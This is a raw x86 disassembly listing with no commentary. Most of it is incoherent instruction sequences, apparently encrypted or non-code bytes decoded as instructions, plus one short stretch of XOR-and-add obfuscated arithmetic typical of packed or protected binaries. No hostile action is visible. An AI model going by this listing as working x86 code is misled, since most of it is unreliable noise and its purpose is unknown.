  41050a:	sbb    DWORD PTR [edx],eax
  41050c:	jno    0x4104e3
  41050e:	je     0x410547
  410510:	xchg   esi,eax
  410511:	not    edx
  410513:	pop    esp
  410514:	rcl    BYTE PTR [eax+0x4ef909b9],0x48
  41051b:	add    DWORD PTR [ecx],esp
  41051d:	es mov eax,0x49b49f62
  410523:	and    eax,0x1c4ff0e7
  410528:	lea    ecx,[ebx-0x56]
  41052b:	jecxz  0x4104d2
  41052d:	jnp    0x41056c
  41052f:	or     DWORD PTR [eax],edi
  410531:	and    DWORD PTR [edi-0x27faf10d],0xffffffd9
  410538:	loop   0x4104d9
  41053a:	test   al,0x2a
  41053c:	cld    
  41053d:	hlt    
  41053e:	sbb    BYTE PTR [ebx],bh
  410540:	xor    esi,edi
  410542:	push   0x1fab892f
  410547:	mov    eax,ds:0x38dc1b18
  41054c:	or     ebx,esp
  41054e:	or     DWORD PTR [ebp+edx*2+0x407908bc],0x4b
  410556:	loop   0x4104f6
  410558:	add    BYTE PTR [esi],bl
  41055a:	lds    edi,FWORD PTR [ebp+0x36ce9f93]
  410560:	pop    ebp
  410561:	or     eax,0x4ef034df
  410566:	sub    edi,esp
  410568:	xor    ebp,ebp
  41056a:	sub    edx,DWORD PTR [ecx-0x7bf03f7b]
  410570:	mov    ss,WORD PTR [eax+eax*1]
  410573:	add    BYTE PTR [ecx-0x1016238b],cl
  410579:	add    eax,DWORD PTR [eax]
  41057b:	add    ch,ah
  41057d:	out    0x6f,al
  41057f:	pop    ebp
  410580:	outs   dx,DWORD PTR ds:[esi]
  410581:	jne    0x410578
  410583:	data16 hlt 
  410585:	test   ebx,eax
  410587:	pushf  
  410588:	mov    eax,0xac39094
  41058d:	mov    edi,0x7d497070
  410592:	jo     0x410604
  410594:	sub    al,0x92
  410596:	xchg   ecx,eax
  410597:	mov    bh,0xd4
  410599:	dec    esi
  41059a:	aam    0x65
  41059c:	xor    al,0xcb
  41059e:	into   
  41059f:	push   esi
  4105a0:	rcr    DWORD PTR [esi],0x9a
  4105a3:	and    BYTE PTR ds:0xeb53e94e,dh
  4105a9:	or     eax,0xe5d3c4db
  4105ae:	xor    DWORD PTR [ebp+0x452d8f4f],0xffffff9d
  4105b5:	sbb    DWORD PTR [edx+eiz*1+0x77],esp
  4105b9:	scas   eax,DWORD PTR es:[edi]
  4105ba:	push   edx
  4105bb:	lods   al,BYTE PTR ds:[esi]
  4105bc:	(bad)  
  4105bd:	jnp    0x41063b
  4105bf:	in     al,0x94
  4105c1:	mov    BYTE PTR [eax],al
  4105c3:	sub    DWORD PTR [edi],esi
  4105c5:	faddp  st(2),st
  4105c7:	cmp    BYTE PTR [ebp-0x63],dh
  4105ca:	fsubrp st(4),st
  4105cc:	shl    DWORD PTR [esi],1
  4105ce:	mov    ds:0xb51b5a7a,eax
  4105d3:	xchg   edi,eax
  4105d4:	sbb    DWORD PTR [ebx],edx
  4105d6:	repnz ins DWORD PTR es:[edi],dx
  4105d8:	xchg   ecx,eax
  4105d9:	xchg   ebx,eax
  4105da:	inc    esi
  4105db:	sub    WORD PTR [ebx+0x5c8aecad],sp
  4105e2:	loope  0x4105d3
  4105e4:	push   esi
  4105e5:	push   ds
  4105e6:	pop    eax
  4105e7:	out    dx,eax
  4105e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4105e9:	mov    esi,0x6a89d894
  4105ee:	pop    eax
  4105ef:	xor    eax,0x1f51d450
  4105f4:	xchg   BYTE PTR [edx+0x335db4ac],cl
  4105fa:	sub    edi,ebp
  4105fc:	xchg   esp,eax
  4105fd:	loop   0x410587
  4105ff:	sub    al,0xf3
  410601:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410602:	out    0x20,eax
  410604:	cmp    eax,0xd804d0cd
  410609:	and    BYTE PTR [esi-0x11],dl
  41060c:	call   0x8e8ef391
  410611:	test   esp,0xdeeb49c3
  410617:	jecxz  0x4105d3
  410619:	cli    
  41061a:	inc    ebx
  41061b:	stos   BYTE PTR es:[edi],al
  41061c:	xor    eax,0x4902ab00
  410621:	pop    es
  410622:	imul   esi,DWORD PTR [eax],0x3e
  410625:	test   DWORD PTR [edi],0x9efb7e2b
  41062b:	ss mov esi,0xb7738fd6
  410631:	cmp    dl,BYTE PTR [ebx-0x2e]
  410634:	push   esi
  410635:	dec    edi
  410636:	fidiv  WORD PTR [esi-0x7000a79b]
  41063c:	scas   eax,DWORD PTR es:[edi]
  41063d:	inc    eax
  41063e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41063f:	js     0x41066c
  410641:	loope  0x410683
  410643:	xchg   ebp,eax
  410644:	shl    DWORD PTR [ebp+0x12],cl
  410647:	push   ecx
  410648:	mov    esi,0xc45508ac
  41064d:	xchg   BYTE PTR [esp+ebp*8+0x7fe05ada],bl
  410654:	and    DWORD PTR [edi],ebx
  410656:	sbb    esp,ebx
  410658:	or     eax,DWORD PTR [eax]
  41065a:	shr    DWORD PTR [ecx],cl
  41065c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41065d:	mov    ch,BYTE PTR [edi]
  41065f:	int    0x9b
  410661:	std    
  410662:	cdq    
  410663:	ror    esp,1
  410665:	lahf   
  410666:	and    eax,0x56533003
  41066b:	pushf  
  41066c:	jnp    0x4106a8
  41066e:	call   0x507b:0x8bebddf5
  410675:	inc    ebp
  410676:	jg     0x41061c
  410678:	ss mov esp,0xaf0a834e
  41067e:	pop    ds
  41067f:	jecxz  0x4106b3
  410681:	xor    dl,bh
  410683:	int3   
  410684:	cmc    
  410685:	inc    ecx
  410686:	mov    eax,0xdbcf8e6c
  41068b:	ror    cl,1
  41068d:	inc    ebx
  41068e:	fdivr  st,st(6)
  410690:	std    
  410691:	aad    0xe
  410693:	jmp    0xf366:0xa4ec5692
  41069a:	cs dec ecx
  41069c:	imul   ebx,DWORD PTR [eax+ecx*4+0x7],0x7ba13f69
  4106a4:	ja     0x410704
  4106a6:	in     al,0x3c
  4106a8:	loopne 0x410653
  4106aa:	das    
  4106ab:	clc    
  4106ac:	jne    0x41066c
  4106ae:	imul   esp,DWORD PTR [ebp-0x1b],0x6c
  4106b2:	xchg   ebx,eax
  4106b3:	ret    
  4106b4:	out    dx,eax
  4106b5:	push   edi
  4106b6:	dec    esi
  4106b7:	pop    ebp
  4106b8:	sbb    eax,0x3b50d06d
  4106bd:	pop    ecx
  4106be:	into   
  4106bf:	mov    al,0x38
  4106c1:	fs push edx
  4106c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106c4:	cmp    bl,cl
  4106c6:	and    BYTE PTR [ebx+ecx*1],0x40
  4106ca:	cld    
  4106cb:	jno    0x410661
  4106cd:	or     BYTE PTR [edi],dh
  4106cf:	add    edi,DWORD PTR [edx-0x6fc5eb54]
  4106d5:	mov    cl,0x45
  4106d7:	pop    ss
  4106d8:	jns    0x410700
  4106da:	cmp    al,0x37
  4106dc:	div    DWORD PTR [edi+0x260806f]
  4106e2:	daa    
  4106e3:	repnz push esi
  4106e5:	mov    bh,0x84
  4106e7:	mov    DWORD PTR [edi+0x37],eax
  4106ea:	fistp  WORD PTR [esi]
  4106ec:	xor    dl,BYTE PTR [edx]
  4106ee:	lods   al,BYTE PTR ds:[esi]
  4106ef:	push   esi
  4106f0:	enter  0xc103,0x78
  4106f4:	es int 0x4e
  4106f7:	pop    esi
  4106f8:	jmp    0xb17f:0x7193faa9
  4106ff:	jecxz  0x410750
  410701:	leave  
  410702:	jns    0x4106e2
  410704:	outs   dx,DWORD PTR ds:[esi]
  410705:	inc    edx
  410706:	fidivr WORD PTR [esp+ebx*2-0x61]
  41070a:	fsub   st,st(4)
  41070c:	pop    ebx
  41070d:	mov    ds:0x8e0a12d9,al
  410712:	inc    ecx
  410713:	xor    al,0x30
  410715:	pop    eax
  410716:	call   0xee1b:0x854acd02
  41071d:	aam    0xbe
  41071f:	or     al,0x74
  410721:	cmp    eax,0x8c30050d
  410726:	sub    al,dh
  410728:	retf   0x2be4
  41072b:	js     0x410743
  41072d:	add    bl,BYTE PTR [esi]
  41072f:	test   eax,0x5a47f614
  410734:	test   DWORD PTR [ecx-0x7f],0xac53c3de
  41073b:	inc    ecx
  41073c:	int3   
  41073d:	in     al,dx
  41073e:	in     al,0xa3
  410740:	popf   
  410741:	gs push 0xffffffe8
  410744:	adc    BYTE PTR [ebx-0x64],bl
  410747:	add    dh,BYTE PTR [eax-0x61]
  41074a:	das    
  41074b:	adc    BYTE PTR [ecx],0xb8
  41074e:	jle    0x4106e4
  410750:	add    DWORD PTR [ecx-0x54],esp
  410753:	clc    
  410754:	pop    eax
  410755:	call   FWORD PTR [ecx]
  410757:	stos   DWORD PTR es:[edi],eax
  410758:	inc    edi
  410759:	test   BYTE PTR [edi+ecx*2],al
  41075c:	(bad)  
  41075e:	cli    
  41075f:	inc    edi
  410760:	imul   edi,DWORD PTR [ecx+0x62dfb10],0xa87bcb85
  41076a:	sub    al,BYTE PTR [edx]
  41076c:	pop    ebp
  41076d:	(bad)  
  41076e:	stos   DWORD PTR es:[edi],eax
  41076f:	pop    edi
  410770:	jp     0x410753
  410772:	jnp    0x4107cd
  410774:	adc    esi,DWORD PTR [esi]
  410776:	or     BYTE PTR [esi],0x8e
  410779:	sbb    BYTE PTR [edi+0x64d3fecb],0x27
  410780:	arpl   WORD PTR [edx],bp
  410782:	adc    bl,BYTE PTR [ebp+0x5c]
  410785:	dec    ebp
  410786:	xchg   ebx,eax
  410787:	jnp    0x410713
  410789:	pushf  
  41078a:	mov    bh,BYTE PTR [edi]
  41078c:	pushf  
  41078d:	scas   al,BYTE PTR es:[edi]
  41078e:	(bad)  
  41078f:	jbe    0x410792
  410791:	retf   0x7f6d
  410794:	repz (bad) 
  410796:	jnp    0x4107e2
  410798:	mov    edx,DWORD PTR ds:0xf50840f8
  41079e:	cwde   
  41079f:	fsub   QWORD PTR ds:0x7038c28f
  4107a5:	(bad)  
  4107a6:	fistp  QWORD PTR [edi-0x63]
  4107a9:	clc    
  4107aa:	push   ecx
  4107ab:	(bad)  
  4107ac:	call   0xdeeb252f
  4107b1:	loope  0x4107b1
  4107b3:	aaa    
  4107b4:	lahf   
  4107b5:	xchg   ecx,eax
  4107b6:	sbb    eax,0x45c8b728
  4107bb:	hlt    
  4107bc:	test   eax,0xca4bc57f
  4107c1:	xor    BYTE PTR [ebx],0x75
  4107c4:	pop    ebx
  4107c5:	in     al,dx
  4107c6:	sub    BYTE PTR [ebp+0x2707c223],dl
  4107cc:	rol    BYTE PTR [ecx+0x45032ffb],cl
  4107d2:	or     bl,ch
  4107d4:	pop    esi
  4107d5:	jle    0x4107da
  4107d7:	div    DWORD PTR [ebp+0x5c6cce8c]
  4107dd:	xchg   ebp,eax
  4107de:	lods   al,BYTE PTR ds:[esi]
  4107df:	fdivr  DWORD PTR [ebp-0x65]
  4107e2:	cld    
  4107e3:	out    dx,al
  4107e4:	lahf   
  4107e5:	mov    esp,0x8e9c2112
  4107ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107eb:	fadd   QWORD PTR [edx]
  4107ed:	push   esp
  4107ee:	cwde   
  4107ef:	xchg   edi,eax
  4107f0:	xor    DWORD PTR [ebx-0x7],esi
  4107f3:	and    eax,0xbe76d6c8
  4107f8:	rcl    edi,0xe0
  4107fb:	out    dx,al
  4107fc:	pop    DWORD PTR [edx]
  4107fe:	xlat   BYTE PTR ds:[ebx]
  4107ff:	cmp    eax,0x19477f8a
  410804:	mov    dh,0xc8
  410806:	adc    DWORD PTR [ebx],eax
  410808:	add    al,0x34
  41080a:	adc    edx,ecx
  41080c:	and    al,0x56
  41080e:	in     al,0x10
  410810:	add    DWORD PTR [ebx],eax
  410812:	mov    ah,0xd0
  410814:	adc    esp,esp
  410816:	dec    ecx
  410817:	(bad)  
  410818:	xchg   ecx,eax
  410819:	sub    dh,0xc7
  41081c:	aaa    
  41081d:	jb     0x4107c1
  41081f:	sub    edx,DWORD PTR [eax-0x49]
  410822:	sbb    BYTE PTR [ecx+0x2d3840b4],dl
  410828:	inc    esp
  410829:	jno    0x410888
  41082b:	xchg   esp,eax
  41082c:	das    
  41082d:	dec    esp
  41082e:	or     eax,0xc30b962d
  410833:	and    DWORD PTR [esi+0x24],ecx
  410836:	sbb    ch,BYTE PTR [edx+edi*1+0x4f0112a2]
  41083d:	icebp  
  41083e:	mov    ds:0xd2225996,eax
  410843:	scas   eax,DWORD PTR es:[edi]
  410844:	jne    0x410875
  410846:	jecxz  0x41083f
  410848:	outs   dx,BYTE PTR ds:[esi]
  410849:	daa    
  41084a:	div    BYTE PTR [ecx-0x13]
  41084d:	push   ds
  41084e:	out    dx,al
  41084f:	cmp    BYTE PTR gs:[eax+0x7587c0e8],0x5f
  410857:	jae    0x410844
  410859:	mov    ebp,0x644d2ef7
  41085e:	xor    BYTE PTR [ebx+0x678f1434],cl
  410864:	jae    0x410873
  410866:	pop    esi
  410867:	mov    bl,0x11
  410869:	jle    0x4107eb
  41086b:	idiv   DWORD PTR [eax]
  41086d:	cli    
  41086e:	jae    0x410855
  410870:	mov    ebx,0xd6d4a3cb
  410875:	jmp    0x410809
  410877:	mov    al,0x1d
  410879:	cs add bh,0x25
  41087d:	scas   al,BYTE PTR es:[edi]
  41087e:	xor    al,0x94
  410880:	adc    eax,0x78194e56
  410885:	pop    ebx
  410886:	(bad)  
  410887:	es cdq 
  410889:	mov    ebp,ecx
  41088b:	sbb    al,0x2f
  41088d:	cmp    eax,0xddc34259
  410892:	or     dl,dh
  410894:	scas   eax,DWORD PTR es:[edi]
  410895:	fisubr WORD PTR [edi-0x71492021]
  41089b:	(bad)  
  41089c:	in     al,0x25
  41089e:	add    esi,DWORD PTR [eax]
  4108a0:	shl    ebx,0x4c
  4108a3:	lock fdiv QWORD PTR [ecx]
  4108a6:	iret   
  4108a7:	jb     0x41085d
  4108a9:	fiadd  DWORD PTR [eax-0x7dfc773c]
  4108af:	ror    ch,1
  4108b1:	(bad)  
  4108b2:	fcompp 
  4108b4:	fidivr WORD PTR [eax+ebp*8-0x67]
  4108b8:	xchg   edx,eax
  4108b9:	aad    0xce
  4108bb:	test   al,0xbd
  4108bd:	mov    gs,edi
  4108bf:	cmp    cl,BYTE PTR cs:[ebx]
  4108c2:	xchg   ecx,eax
  4108c3:	leave  
  4108c4:	sub    eax,0xf6019e5d
  4108c9:	add    al,0xc5
  4108cb:	scas   eax,DWORD PTR es:[edi]
  4108cc:	cli    
  4108cd:	cmp    DWORD PTR [edi-0x3b],ebx
  4108d0:	adc    al,BYTE PTR [ebx]
  4108d2:	jb     0x41087e
  4108d4:	loop   0x4108b7
  4108d6:	ins    DWORD PTR es:[edi],dx
  4108d7:	jns    0x41094e
  4108d9:	xchg   ah,ch
  4108db:	shl    BYTE PTR [esi-0x68],1
  4108de:	aas    
  4108df:	clc    
  4108e0:	mov    BYTE PTR [ebx+esi*1],ch
  4108e3:	scas   al,BYTE PTR es:[edi]
  4108e4:	mov    DWORD PTR ds:0x56dc1555,edx
  4108ea:	add    eax,0xfa606c32
  4108ef:	test   ch,bh
  4108f1:	dec    ebx
  4108f2:	jae    0x4108c9
  4108f4:	mov    WORD PTR [eax+eiz*4-0x52],ds
  4108f8:	dec    esp
  4108f9:	mov    BYTE PTR [eax-0x31c57e18],bl
  4108ff:	into   
  410900:	popf   
  410901:	mov    ah,0x21
  410903:	loope  0x410932
  410905:	jmp    0x7174:0xeb21c53
  41090c:	inc    ecx
  41090d:	add    esi,edi
  41090f:	in     eax,dx
  410910:	add    BYTE PTR [ebx-0x4bd3dbf5],al
  410916:	in     al,0xfe
  410918:	add    BYTE PTR [edi+0x25],bl
  41091b:	mov    bh,BYTE PTR [edx]
  41091d:	and    dh,BYTE PTR [ecx]
  41091f:	jge    0x4108d6
  410921:	fs mov edi,0x480d26ea
  410927:	retf   0x2ae5
  41092a:	mov    ds:0xd82d8e65,eax
  41092f:	loop   0x4108c6
  410931:	adc    BYTE PTR [edi-0x57dfa4f5],al
  410937:	out    dx,eax
  410938:	push   edx
  410939:	stos   DWORD PTR es:[edi],eax
  41093a:	mov    eax,ds:0x55e4ae6
  41093f:	push   es
  410940:	push   ecx
  410941:	jmp    0x4109b1
  410943:	in     eax,0x2f
  410945:	fidivr WORD PTR [ecx+0x56]
  410948:	mov    eax,0x3be11805
  41094d:	inc    ecx
  41094e:	pop    ebp
  41094f:	je     0x4109ce
  410951:	mov    edx,esi
  410953:	mov    WORD PTR [esi-0x194f1d1a],gs
  410959:	mov    ebx,0x76c0312e
  41095e:	fistp  WORD PTR [ecx+0x16]
  410961:	cmp    eax,0x990ed22
  410966:	sbb    edx,DWORD PTR [ebx]
  410968:	cwde   
  410969:	xor    cl,bh
  41096b:	push   0xb
  41096d:	pop    ecx
  41096e:	push   0x5
  410970:	dec    ecx
  410971:	pop    ebx
  410972:	xchg   ebx,ecx
  410974:	sub    ebx,ecx
  410976:	xchg   ebx,ecx
  410978:	dec    ecx
  410979:	mov    eax,DWORD PTR [ebp-0x1c]
  41097c:	imul   eax,ecx
  41097f:	sub    esp,eax
  410981:	mov    DWORD PTR [ebp-0x24],esp
  410984:	mov    eax,DWORD PTR [ebp-0x4]
  410987:	mov    ecx,0x7510855
  41098c:	xor    eax,ecx
  41098e:	mov    edx,0x32729c
  410993:	add    eax,edx
  410995:	mov    DWORD PTR [ebp+0x8],eax
  410998:	mov    eax,DWORD PTR [ebp-0x18]
  41099b:	xor    eax,ecx
  41099d:	add    eax,edx
  41099f:	mov    edx,DWORD PTR [ebp+0x14]
  4109a2:	imul   eax,DWORD PTR [edx]
  4109a5:	mov    edx,DWORD PTR [ebp-0x4]
  4109a8:	xor    edx,ecx
  4109aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4109ad:	lea    ecx,[edx+ecx*1+0x32729c]
  4109b4:	cmp    ecx,eax
  4109b6:	je     0x4119fd
  4109bc:	mov    edi,DWORD PTR [ebp-0x18]
  4109bf:	mov    eax,DWORD PTR [ebp+0x8]
  4109c2:	mov    edx,DWORD PTR [ebp+0x14]
  4109c5:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4109c9:	mov    ecx,0x7510855
  4109ce:	xor    edx,edx
  4109d0:	xor    edi,ecx
  4109d2:	mov    esi,0x32729c
  4109d7:	add    edi,esi
  4109d9:	div    edi
  4109db:	mov    edx,DWORD PTR [ebp-0x4]
  4109de:	xor    edx,ecx
  4109e0:	lea    eax,[edx+eax*1+0x32729c]
  4109e7:	mov    edx,DWORD PTR [ebp+0x8]
  4109ea:	mov    edi,DWORD PTR [ebp-0x24]
  4109ed:	mov    DWORD PTR [edi+edx*4],eax
  4109f0:	mov    eax,DWORD PTR [ebp-0x18]
  4109f3:	jmp    0x410de7
  4109f8:	ja     0x41099d
  4109fa:	mov    ecx,0x7175496f
  4109ff:	mov    ds:0xd6da6ce9,eax
  410a04:	mov    bl,0x34
  410a06:	sbb    al,0xca
  410a08:	arpl   WORD PTR [eax+esi*2+0x707d4970],di
  410a0f:	jo     0x4109ce
  410a11:	les    ebp,FWORD PTR [ebx+0xc]
  410a14:	xor    ch,bh
  410a16:	cs scas al,BYTE PTR es:[edi]
  410a18:	cld    
  410a19:	bnd jae 0x410a77
  410a1c:	fwait
  410a1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a1e:	ds mov edi,0x93d0c8f3
  410a24:	popf   
  410a25:	inc    esp
  410a26:	push   ss
  410a27:	adc    bl,dh
  410a29:	and    bh,ch
  410a2b:	mov    bh,ah
  410a2d:	rcr    BYTE PTR [ecx+edi*1],1
  410a30:	mov    esp,0xe89e072b
  410a35:	add    esi,eax
  410a37:	ss hlt 
  410a39:	jg     0x410aae
  410a3b:	dec    ecx
  410a3c:	bound  esp,QWORD PTR [ebp-0xb]
  410a3f:	pop    es
  410a40:	sbb    DWORD PTR [edx-0x4c62a9cd],edi
  410a46:	repz inc eax
  410a48:	lahf   
  410a49:	adc    al,BYTE PTR [eax-0x4f]
  410a4c:	lods   eax,DWORD PTR ds:[esi]
  410a4d:	mov    edx,DWORD PTR [esi+0x3f8cbba9]
  410a53:	mov    ah,0xac
  410a55:	paddw  mm6,QWORD PTR [ebx+0x2a]
  410a59:	pop    es
  410a5a:	iret   
  410a5b:	push   ss
  410a5c:	jmp    0xda979055
  410a61:	pop    eax
  410a62:	ss inc esi
  410a64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a65:	dec    edi
  410a66:	test   dh,dh
  410a68:	(bad)  
  410a69:	fs scas al,BYTE PTR es:[edi]
  410a6b:	in     al,0x7b
  410a6d:	ins    DWORD PTR es:[edi],dx
  410a6e:	gs mov ch,0xfd
  410a71:	dec    ebx
  410a72:	cmc    
  410a73:	cmp    DWORD PTR [eax],ebx
  410a75:	pop    eax
  410a76:	call   0xa456:0xdcdadd78
  410a7d:	fs mov cl,0x11
  410a80:	into   
  410a81:	and    bl,al
  410a83:	iret   
  410a84:	arpl   WORD PTR [esi],si
  410a86:	pslld  mm4,QWORD PTR [eax-0x7]
  410a8a:	shl    DWORD PTR [ecx+0x305a06e9],1
  410a90:	bound  eax,QWORD PTR [ecx+0x3c]
  410a93:	mov    cl,0x27
  410a95:	xchg   ecx,eax
  410a96:	mov    esp,ebx
  410a98:	aas    
  410a99:	aad    0xa0
  410a9b:	or     cl,BYTE PTR [edi]
  410a9d:	add    al,0xbb
  410a9f:	daa    
  410aa0:	sub    esp,DWORD PTR [eax]
  410aa2:	fstp   QWORD PTR [ebp+0x5c3b446d]
  410aa8:	aaa    
  410aa9:	data16 loopne 0x410a82
  410aac:	test   DWORD PTR [ebp-0x6f],0x8183b9fc
  410ab3:	fdivrp st(2),st
  410ab5:	stc    
  410ab6:	mov    DWORD PTR [ecx+0x7974e5fc],edx
  410abc:	popa   
  410abd:	push   edx
  410abe:	push   eax
  410abf:	push   edx
  410ac0:	xchg   edi,eax
  410ac1:	ds pop es
  410ac3:	cmovle ebx,edx
  410ac6:	ror    BYTE PTR [ecx-0x2b],0x6e
  410aca:	mov    ch,0xcb
  410acc:	inc    eax
  410acd:	mov    ebp,esp
  410acf:	cs ja  0x410a7b
  410ad2:	aaa    
  410ad3:	popf   
  410ad4:	(bad)  
  410ad5:	out    dx,al
  410ad6:	dec    esi
  410ad7:	leave  
  410ad8:	test   al,0xad
  410ada:	or     eax,0x1d168317
  410adf:	enter  0x2705,0xbe
  410ae3:	fimul  WORD PTR [eax]
  410ae5:	push   cs
  410ae6:	push   ebx
  410ae7:	in     al,dx
  410ae8:	cmp    ebx,DWORD PTR ds:0x110a7642
  410aee:	mov    eax,ds:0xb9dca362
  410af3:	retf   
  410af4:	push   esp
  410af5:	addr16 mov al,0xe6
  410af8:	fistp  DWORD PTR [ecx]
  410afa:	sub    ebx,DWORD PTR [ebp-0x10c2cc9b]
  410b00:	jle    0x410b68
  410b02:	xchg   ebx,eax
  410b03:	xchg   BYTE PTR [ebx],al
  410b05:	jle    0x410add
  410b07:	es test al,0x67
  410b0a:	sub    DWORD PTR [edi],esi
  410b0c:	rcl    edi,0x8c
  410b0f:	mov    edx,0xfbf73373
  410b14:	push   ds
  410b15:	sbb    ebx,DWORD PTR [ecx]
  410b17:	mov    al,0x27
  410b19:	mov    edx,0xf0a20e15
  410b1e:	jno    0x410b0e
  410b20:	inc    edx
  410b21:	jl     0x410ace
  410b23:	(bad)  
  410b24:	imul   esp,DWORD PTR fs:[ebx],0xfffffff6
  410b28:	int3   
  410b29:	(bad)  
  410b2a:	cli    
  410b2b:	pop    ebp
  410b2c:	dec    ebp
  410b2d:	mov    al,ds:0x87de5625
  410b32:	xchg   ebx,eax
  410b33:	pop    ss
  410b34:	lods   eax,DWORD PTR ds:[esi]
  410b35:	add    eax,0xa04465bf
  410b3a:	mov    dl,0x39
  410b3c:	rdtsc  
  410b3e:	pop    esp
  410b3f:	mov    dh,0xf4
  410b41:	xchg   edx,eax
  410b42:	mov    ds:0x6111705b,eax
  410b47:	mov    eax,0xde6da4a1
  410b4c:	in     eax,0x71
  410b4e:	mov    ah,0x1f
  410b50:	pop    edx
  410b51:	ins    DWORD PTR es:[edi],dx
  410b52:	aas    
  410b53:	sbb    eax,0x2d1095e5
  410b58:	addr16 jp 0x410bc2
  410b5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b5c:	fcom   st(4)
  410b5e:	fld    DWORD PTR [edx-0x6158c455]
  410b64:	pop    ecx
  410b65:	mov    dh,0x2a
  410b67:	es inc ebx
  410b69:	scas   eax,DWORD PTR es:[edi]
  410b6a:	ror    DWORD PTR ds:0xf8a18305,0x5d
  410b71:	sbb    esi,eax
  410b73:	or     DWORD PTR ds:0xf730097a,ebx
  410b79:	mov    cl,0x95
  410b7b:	clc    
  410b7c:	xchg   esp,esi
  410b7e:	push   0xffffffc8
  410b80:	push   ebx
  410b81:	cmp    ebx,DWORD PTR [edx+0x120beed4]
  410b87:	add    BYTE PTR [ecx-0x35fb602b],al
  410b8d:	xchg   edi,eax
  410b8e:	sbb    cl,bh
  410b90:	es js  0x410bca
  410b93:	pop    edx
  410b94:	leave  
  410b95:	adc    ecx,0x31
  410b98:	addr16 cmp al,0x3c
  410b9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b9c:	mov    esi,0x8f2db7f
  410ba1:	xchg   BYTE PTR [edx-0x33],al
  410ba4:	jmp    0x410b3f
  410ba6:	adc    dl,al
  410ba8:	in     eax,0xff
  410baa:	xor    eax,0x2b7d136d
  410baf:	mov    eax,0xf8003231
  410bb4:	scas   eax,DWORD PTR es:[edi]
  410bb5:	sub    BYTE PTR [ebx-0x1b],ch
  410bb8:	je     0x410b6a
  410bba:	bound  ecx,QWORD PTR [ebp-0x60]
  410bbd:	fsub   QWORD PTR [edi*1+0x6166eaf6]
  410bc4:	ret    
  410bc5:	mov    al,0x10
  410bc7:	adc    esp,ebp
  410bc9:	mov    dh,0xaf
  410bcb:	cmovo  esi,DWORD PTR [edi-0x47]
  410bcf:	cmp    DWORD PTR [ecx-0x1acc4d5],ebp
  410bd5:	inc    edi
  410bd6:	push   ebp
  410bd7:	jb     0x410c42
  410bd9:	mov    DWORD PTR [ebx-0x6ae9301c],esp
  410bdf:	jge    0x410ba6
  410be1:	pop    esp
  410be2:	push   ecx
  410be3:	test   eax,0x8748aaf1
  410be8:	cwde   
  410be9:	in     al,dx
  410bea:	cs jmp 0x19b5:0xf736c584
  410bf2:	push   edx
  410bf3:	cmp    edx,DWORD PTR [ebx]
  410bf5:	div    DWORD PTR [ecx+esi*1]
  410bf8:	push   ebx
  410bf9:	stos   DWORD PTR es:[edi],eax
  410bfa:	pop    ss
  410bfb:	jg     0x410c7a
  410bfd:	sbb    esp,DWORD PTR [ecx+0x124a9382]
  410c03:	jp     0x410c4c
  410c05:	sub    DWORD PTR [ebx],0xbab834db
  410c0b:	in     al,0x73
  410c0d:	inc    edx
  410c0e:	cmc    
  410c0f:	pop    es
  410c10:	xchg   ebp,eax
  410c11:	ds add al,0x24
  410c14:	cmp    al,0x29
  410c16:	push   esi
  410c17:	adc    DWORD PTR [ebx],ebx
  410c19:	pop    eax
  410c1a:	or     eax,0x8f406242
  410c1f:	pop    edi
  410c20:	mov    edx,0x843cc5ff
  410c25:	adc    ecx,DWORD PTR [edi]
  410c27:	aam    0x19
  410c29:	fwait
  410c2a:	jbe    0x410c70
  410c2c:	sub    al,0x21
  410c2e:	xor    DWORD PTR [edi],edi
  410c30:	call   0x72a3add9
  410c35:	aas    
  410c36:	adc    bh,dh
  410c38:	push   cs
  410c39:	addr16 inc edx
  410c3b:	(bad)
  410c3e:	hlt    
  410c3f:	dec    esp
  410c40:	sti    
  410c41:	out    0x85,al
  410c43:	push   ax
  410c45:	pop    eax
  410c46:	sub    BYTE PTR [ecx-0x2934c216],bh
  410c4c:	dec    esi
  410c4d:	push   ebx
  410c4e:	push   ebp
  410c4f:	jne    0x410c1e
  410c51:	lock push edx
  410c53:	mov    al,0xc3
  410c55:	mov    al,0x31
  410c57:	dec    ebp
  410c58:	push   ebx
  410c59:	mov    bl,BYTE PTR [edx+0x65c4b056]
  410c5f:	push   esi
  410c60:	fmul   st,st(0)
  410c62:	xchg   ebx,eax
  410c63:	jbe    0x410c1c
  410c65:	int    0xb
  410c67:	sbb    bl,BYTE PTR [ebp+0xc0f8e63]
  410c6d:	dec    edx
  410c6e:	std    
  410c6f:	sbb    esi,DWORD PTR [ecx+0x25af1dae]
  410c75:	push   esp
  410c76:	jle    0x410c37
  410c78:	and    bh,0xa3
  410c7b:	daa    
  410c7c:	(bad)  
  410c7d:	popf   
  410c7e:	shr    BYTE PTR [esp+ecx*2-0x77],cl
  410c82:	add    eax,0x147c4415
  410c87:	and    eax,0x67f36ec0
  410c8c:	pop    edi
  410c8d:	cdq    
  410c8e:	adc    eax,0x7bf4076a
  410c93:	cwde   
  410c94:	push   eax
  410c95:	lock inc ebx
  410c97:	sbb    edx,DWORD PTR [ebx-0x9d901b3]
  410c9d:	dec    esp
  410c9e:	leavew 
  410ca0:	ins    BYTE PTR es:[edi],dx
  410ca1:	out    0xa0,al
  410ca3:	xchg   BYTE PTR [eax+0x45],ch
  410ca6:	scas   al,BYTE PTR es:[edi]
  410ca7:	mov    cl,0xba
  410ca9:	pusha  
  410caa:	jo     0x410c7f
  410cac:	sbb    BYTE PTR [eax],al
  410cae:	jb     0x410c5c
  410cb0:	pop    ds
  410cb1:	add    bl,ch
  410cb3:	int3   
  410cb4:	clc    
  410cb5:	sar    edi,1
  410cb7:	popf   
  410cb8:	ret    0x232e
  410cbb:	mov    BYTE PTR [edi-0x644f078f],cl
  410cc1:	push   ebp
  410cc2:	mov    cl,0xf1
